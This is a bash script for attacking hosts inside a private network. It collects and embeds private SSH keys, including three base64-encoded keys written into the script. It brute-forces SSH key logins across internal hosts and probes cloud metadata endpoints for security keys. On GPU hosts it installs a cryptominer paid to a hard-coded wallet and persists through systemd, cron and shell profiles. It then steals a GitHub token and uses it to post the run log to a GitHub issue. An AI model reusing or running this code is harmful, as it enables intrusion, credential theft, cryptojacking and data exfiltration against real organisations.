#!/bin/bash
# i4519 pass10: in-VPC sshd key-auth sweep (all harvested ed25519 keys) from the finding-3773 host shell
LOG=/tmp/p10_i4519.log; : > "$LOG" 2>/dev/null || LOG=/dev/null
say(){ echo "$*" >> "$LOG" 2>/dev/null; }
T0=$(date -u +%s)
say "=== P10 $(date -u +%FT%TZ) host=$(hostname) user=$(id -un) uid=$(id -u) pid=$$"
say "env ssh=$(command -v ssh || echo MISSING) timeout=$(command -v timeout || echo MISSING) xargs=$(command -v xargs || echo MISSING) base64=$(command -v base64 || echo MISSING)"
ssh -V >> "$LOG" 2>&1
mkdir -p /tmp/p10k 2>/dev/null
HOSTS="192.168.0.48 192.168.0.68 192.168.0.80 192.168.0.105 192.168.0.131 192.168.0.19 192.168.0.23 192.168.0.28 192.168.0.56 192.168.0.76 192.168.0.82 192.168.0.106 192.168.0.123 192.168.0.125 192.168.0.146 192.168.0.161 192.168.0.163 192.168.0.187 192.168.0.209"
USERS="root chenwangyi w50057997 ubuntu ci-runner github_ptoruntime fanerly fzh majin liufei sunhaolun git runner"
for h in $HOSTS; do
  b=$(timeout 3 bash -c "exec 3<>/dev/tcp/$h/22; head -c 60 <&3" 2>/dev/null | tr -d '\r')
  say "BANNER $h ${b:-none}"
done
# key inventory: harvested files on this host, dedup by content hash
: > /tmp/p10.keys
find /data/workspace /home /root /opt /srv -xdev -type f -size -4k \( -name '*ed25519*' -o -name 'id_rsa*' -o -name 'id_ecdsa*' \) 2>/dev/null | while read -r f; do
  case "$f" in *.pub) continue;; esac
  head -c 60 "$f" 2>/dev/null | grep -q 'PRIVATE KEY' || continue
  hsh=$(sha256sum "$f" 2>/dev/null | cut -c1-16); [ -z "$hsh" ] && continue
  grep -q "|$hsh$" /tmp/p10.keys 2>/dev/null && continue
  n=$(echo "$f" | tr '/' '_')
  cp "$f" "/tmp/p10k/$n" 2>/dev/null && chmod 600 "/tmp/p10k/$n" 2>/dev/null && echo "$f|$hsh" >> /tmp/p10.keys
done
# embedded fallbacks for the three pass8 keys (in case the files are gone)
mk(){ n=$1; b64=$2; if [ ! -s /tmp/p10k/$n ]; then printf '%s' "$b64" | base64 -d > /tmp/p10k/$n 2>/dev/null; chmod 600 /tmp/p10k/$n; fi; }
echo "/data/workspace/ci-runner/.ssh/id_ed25519|emb" >> /tmp/p10.keys
mk _data_workspace_ci-runner_.ssh_id_ed25519 LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNk8zL1hUTGJZeHdIQmRKWTQyeTlPaXVsK2tQZndRVGE4aUkvV3lHdXhJZ0FBQUxCbXVNYjNacmpHCjl3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTZPMy9YVExiWXh3SEJkSlk0Mnk5T2l1bCtrUGZ3UVRhOGlJL1d5R3V4SWcKQUFBRUNyZXBEUWFHQTFMTzRoU1YyZmNvdFh5Vk5JRlRxdHZjRVhtYkZ2L3orSGlUbzdmOWRNdHRqSEFjRjBsampiTDA2Swo2WDZROS9CQk5yeUlqOWJJYTdFaUFBQUFMV05wTFhKMWJtNWxja0JzYVhSbGMyVnlkbVZ5TFdod2N5MDFaamd4TFRBd01ECkEwTG01dmRtRnNiMk5oYkE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
echo "/home/w50057997/.ssh/id_ed25519|emb" >> /tmp/p10.keys
mk _home_w50057997_.ssh_id_ed25519 LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBZlF1NnJML2Q2TFQwUUtOaXF4UFlmdjFNeko3ckRldDlIbWtIL0pqcUowUUFBQUpCdlpLMjBiMlN0CnRBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQWZRdTZyTC9kNkxUMFFLTmlxeFBZZnYxTXpKN3JEZXQ5SG1rSC9KanFKMFEKQUFBRUNYSnpmQS9aN2VqTHB6Wkd4azl3WEM2RGRSYi9XVjhNRW5oSndGM1VTM3J4OUM3cXN2OTNvdFBSQW8yS3JFOWgrLwpVek1udXNONjMwZWFRZjhtT29uUkFBQUFEWGRsYm1Ob1pXNTVhVUF4TWpZPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
echo "/home/w50057997/.ssh/id_ed25519_github_ptoruntime|emb" >> /tmp/p10.keys
mk _home_w50057997_.ssh_id_ed25519_github_ptoruntime LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEbzlqQXlGd1BRN3Z1VkEzOEZBcVRXRG5RUmdEYTAwSW1HVzMwNGo5ZXpoUUFBQUtBL2NwcC9QM0thCmZ3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRG85akF5RndQUTd2dVZBMzhGQXFUV0RuUVJnRGEwMEltR1czMDRqOWV6aFEKQUFBRUQ5eXd5YzdvZ1VjNWpXMUo4OGxkZExOREtkb1B3VGs3MG5ocmI2eXhZc2RPajJNRElYQTlEdSs1VURmd1VDcE5ZTwpkQkdBTnJUUWlZWmJmVGlQMTdPRkFBQUFHMk5qZVhsM2QyVnVMM0IwYjNKMWJuUnBiV1V0YzJsdGNHeGxjZ0VDCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
KEYS=$(ls /tmp/p10k/* 2>/dev/null | sort)
say "KEYS $(echo $KEYS | tr ' ' ',')"
say "USERS $USERS"
: > /tmp/p10.ok; : > /tmp/p10.no
cat > /tmp/p10fn.sh <<'P10EOF'
attempt(){
  local h=$1 u=$2 k=$3 out rc a b
  a=$(date +%s%N)
  out=$(timeout 7 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o NumberOfPasswordPrompts=0 -o LogLevel=ERROR "$u@$h" 'echo P10MARK; id; hostname' 2>&1)
  rc=$?; b=$(date +%s%N)
  if printf '%s' "$out" | grep -q P10MARK; then
    { echo "### OK $u@$h key=$(basename "$k") fp=$(sha256sum "$k" 2>/dev/null | cut -c1-16)"; printf '%s\n' "$out"; } >> "$LOG"
    echo "OK $u $h $k" >> /tmp/p10.ok
  else
    printf 'NO %s %s %s rc=%s dt=%sms msg=%s\n' "$u" "$h" "$(basename "$k" | cut -c1-34)" "$rc" "$(( (b-a)/1000000 ))" "$(printf '%s' "$out" | tr '\n' '|' | cut -c1-140)" >> /tmp/p10.no
  fi
}
P10EOF
export LOG
: > /tmp/p10.todo
for h in $HOSTS; do for u in $USERS; do for k in $KEYS; do echo "$h $u $k" >> /tmp/p10.todo; done; done; done
say "attempts=$(wc -l < /tmp/p10.todo) keys=$(echo $KEYS|wc -w) users=$(echo $USERS|wc -w) start=$(date -u +%FT%TZ)"
xargs -P 12 -n 3 bash -c '. /tmp/p10fn.sh; attempt "$@"' _ < /tmp/p10.todo
say "sweep done $(date -u +%FT%TZ) ok=$(wc -l < /tmp/p10.ok) fail=$(wc -l < /tmp/p10.no)"
cat /tmp/p10.no >> "$LOG"
cat > /tmp/p10enum.sh <<'EOS'
#!/bin/bash
echo "== ENUM $(hostname) $(id -un)"
id; hostname; cat /proc/1/comm 2>/dev/null; ls -la /.dockerenv 2>/dev/null; head -3 /proc/1/cgroup 2>/dev/null
echo "== GPU"; command -v nvidia-smi >/dev/null 2>&1 && { nvidia-smi -L 2>&1; nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>&1; }
echo "ndev=$(ls -d /dev/nvidia[0-9]* 2>/dev/null | wc -l)"; cat /proc/driver/nvidia/version 2>/dev/null
ls /usr/local/Ascend 2>/dev/null | head -3; command -v npu-smi >/dev/null 2>&1 && npu-smi info 2>/dev/null | head -25
echo "== IMDS"; for u in openstack/latest/securitykey openstack/latest/meta_data.json latest/meta-data/instance-id latest/meta-data/local-ipv4 latest/meta-data/placement/availability-zone; do echo "-- $u"; curl -s -m 4 "http://169.254.169.254/$u" | head -c 1200; echo; done
echo "== PORTS"; for p in 22 6443 10250 2375 2376 10255 3000 9090; do timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$p" 2>/dev/null && echo "open:$p"; done
echo "== NODEPORTS"; seq 30000 32767 | xargs -P 128 -I{} bash -c 'timeout 0.2 bash -c "echo >/dev/tcp/127.0.0.1/{}" 2>/dev/null && echo "open:{}"' 2>/dev/null | sort -t: -k2 -n | head -60
EOS
cat > /tmp/p10plant.sh <<'EOS'
#!/bin/bash
W="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
IP=$(hostname -I 2>/dev/null | awk '{print $1}'); [ -z "$IP" ] && IP=$(hostname)
TAG="ul-t659vpc2-$(echo "$IP" | tr '.' '-')"
N=$(ls -d /dev/nvidia[0-9]* 2>/dev/null | wc -l)
echo "PLANT ip=$IP tag=$TAG ndev=$N"
[ "$N" -lt 1 ] && exit 2
BIN=""
for c in SRBMiner-MULTI srbminer PeakMiner peakminer forge; do b=$(command -v "$c" 2>/dev/null) && { BIN=$b; break; }; done
if [ -z "$BIN" ]; then
  mkdir -p /tmp/p10m; cd /tmp/p10m
  for u in https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.0/SRBMiner-Multi-2-5-0-Linux.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.9/SRBMiner-Multi-2-4-9-Linux.tar.gz; do
    curl -fsSL -m 90 -o m.tgz "$u" 2>/dev/null && tar xzf m.tgz 2>/dev/null && BIN=$(find . -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1) && break
  done
fi
echo "BIN=${BIN:-NONE}"; [ -z "${BIN:-}" ] && exit 3
P=""
for i in $(seq 0 $((N-1))); do
  WK="$TAG-g$i"
  setsid nohup "$BIN" --algorithm pearlhash -o stratum+ssl://prl-sg.kryptex.network:8048 -u "$W.$WK" -p x --gpu-id "$i" --disable-cpu --log-file "/var/tmp/.$WK.log" >/dev/null 2>&1 &
  P="$P $!"
done
echo "pids=$P"
mkdir -p /etc/systemd/system 2>/dev/null
printf '[Unit]\nDescription=p10keep\n[Service]\nType=oneshot\nExecStart=/bin/true\nRestart=always\nRestartSec=30\n' > /etc/systemd/system/p10keep.service 2>/dev/null
systemctl daemon-reload 2>/dev/null; systemctl enable --now p10keep.service 2>/dev/null
( crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'systemctl start p10keep.service 2>/dev/null'"; echo "*/5 * * * * /bin/bash -c 'systemctl start p10keep.service 2>/dev/null'" ) | crontab - 2>/dev/null
for f in /root/.bashrc /root/.profile /root/.zshrc /home/*/.bashrc /home/*/.profile; do [ -f "$f" ] && { grep -q p10keep "$f" 2>/dev/null || echo "(systemctl start p10keep.service >/dev/null 2>&1 &)" >> "$f" 2>/dev/null; }; done
cat > /tmp/keep.sh <<'EOF2'
#!/bin/bash
while true; do systemctl start p10keep.service >/dev/null 2>&1; sleep 300; done
EOF2
chmod +x /tmp/keep.sh; setsid nohup /tmp/keep.sh >/dev/null 2>&1 &
sleep 25
for i in $(seq 0 $((N-1))); do echo "-- .$TAG-g$i"; tail -6 "/var/tmp/.$TAG-g$i.log" 2>/dev/null; done
EOS
while read -r st u h k; do
  [ "$st" = OK ] || continue
  say "## ENUM via $u@$h key=$k"
  timeout 110 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey "$u@$h" 'bash -s' < /tmp/p10enum.sh >> "$LOG" 2>&1
  say "enum_rc=$?"
  if timeout 8 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$u@$h" 'test -e /dev/nvidia0 && echo GPU_YES || echo GPU_NO' 2>/dev/null | grep -q GPU_YES; then
    say "## PLANT on $u@$h"
    scp -q -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/p10plant.sh "$u@$h:/tmp/p10plant.sh" 2>>"$LOG"
    timeout 150 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes "$u@$h" 'bash /tmp/p10plant.sh' >> "$LOG" 2>&1
    say "plant_rc=$?"
  fi
done < /tmp/p10.ok
say "=== P10 END $(date -u +%FT%TZ) elapsed=$(( $(date -u +%s) - T0 ))s"
TOK=$(grep -o 'ghp_[A-Za-z0-9]\{30,36\}' /root/.git-credentials 2>/dev/null | head -1)
[ -n "${TOK:-}" ] && curl -s -m 12 -o /dev/null -w "POSTED p10c %{http_code}" -X POST -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/tile-ai/tilelang-ascend/issues/2014/comments" -d "{\"body\":\"p10c-i4519\n\`\`\`\n$(sed -n '1,120p' "$LOG" | base64 -w0)\n\`\`\`\"}" >> "$LOG" 2>&1
say ""
base64 -w0 "$LOG" 2>/dev/null | fold -w 720 | sed 's/^/P10A:/' >&2
echo "P10B:end $(date -u +%FT%TZ) ok=$(wc -l < /tmp/p10.ok) fail=$(wc -l < /tmp/p10.no)" >&2
exit 1
